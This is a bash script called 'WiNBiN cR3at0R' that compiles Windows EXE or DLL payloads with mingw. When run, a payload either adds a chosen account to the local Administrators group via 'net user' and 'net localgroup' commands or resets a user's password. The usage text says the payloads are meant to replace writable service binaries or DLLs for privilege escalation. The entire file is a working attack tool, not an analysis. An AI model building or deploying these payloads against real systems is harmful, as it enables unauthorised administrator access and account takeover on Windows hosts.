#!/bin/bash
usage()
{
        echo " ############################################################# "
        echo "#'                   WiNBiN cR3at0R  v0.1                    '#"
        echo "#,               by: LancreFi                                ,#"
        echo " ############################################################# "
        echo "#'                                                           '#"
        echo "#  Usage: bash winbin.sh <payload> <user> <password> <type>   #"
        echo "#                                                             #"
        echo "#  Available payloads: adduser                                #"
        echo "#                      Creates an executable which when run   #"
        echo "#                      can try to add the <user> with         #"
        echo "#                      <password> to the windows host's       #"
        echo "#                      Administrators group. For example if   #"
        echo "#                      you have F rights on a service binary  #"
        echo "#                      can replace it with this to profit.    #"
        echo "#                                                             #"
        echo "#                      changepass                             #"
        echo "#                      Changes a user's password if you can   #"
        echo "#                      for example run a binary/service as    #"
        echo "#                      this user where the binary/service is  #"
        echo "#                      something you can replace with the     #"
        echo "#                      executable/dll produced by this script.#"
        echo "#                                                             #"
        echo "#  Type: either dll or exe, which ever you want to create.    #"
        echo "#                                                             #"
        echo "#,___________________________________________________________,#"
}


command="${1}"
builder="x86_64-w64-mingw32-gcc"

if [[ "${command^^}" == "ADDUSER" ]] || [[ "${command^^}" == "CHANGEPASS" ]]
then
        user="${2}"
        if [[ -z "${user}" ]]
        then
                echo "You forgot to add the destination username and password!"
                echo "Example: bash winbin.sh adduser username userpassword dll"
                exit
        fi
        pass="${3}"
        if [[ -z "${pass}" ]]
        then
                echo "You forgot to add the destination password!"
                echo "Example: bash winbin.sh adduser username userpassword dll"
                exit
        fi
        type="${4}"
        if [[ "${type^^}" != "DLL" ]] && [[ "${type^^}" != "EXE" ]]
        then
                echo "You need to choose which to create, DLL or EXE!"
                echo "Example: bash winbin.sh adduser username userpassword dll"
                exit
        fi

        echo '#include <stdlib.h>' > "${command,,}.c"

        if [[ "${type^^}" == "DLL" ]]
        then
                printf '#include <windows.h>
                BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )
                { switch ( ul_reason_for_call )
                        { case DLL_PROCESS_ATTACH:' >> "${command,,}.c"
        else
                printf 'int main () {' >> "${command,,}.c"
        fi

        printf 'int i;' >> "${command,,}.c"

        if [[ "${command^^}" == "ADDUSER" ]]
        then
                printf 'i = system ("net user '${user}' '${pass}' /add");
                i = system ("net localgroup administrators '${user}' /add");' >> "${command,,}.c"
        else
                printf 'i = system ("net user '${user}' '${pass}'");' >> "${command,,}.c"
        fi

        if [[ "${type^^}" == "DLL" ]]
        then
                printf 'break;
                case DLL_THREAD_ATTACH:
                break;
                case DLL_THREAD_DETACH:
                break;
                case DLL_PROCESS_DETACH:
                break; } return TRUE; }' >> "${command,,}.c"
        else
                printf 'return 0; }' >> "${command}.c"
        fi

        build_params="${command,,}.c -o ${command,,}.${type,,}"
        if [[ "${type^^}" == "DLL" ]]
        then
                build_params="${build_params} --shared"
        fi
        ${builder} ${build_params}
        echo "Created ${command,,}.c and ${command,,}.${type}"

elif [[ "${command^^}" == "-H" ]] || [[ "${command^^}" == "--HELP" ]]
then
        usage
else
        exit
fi
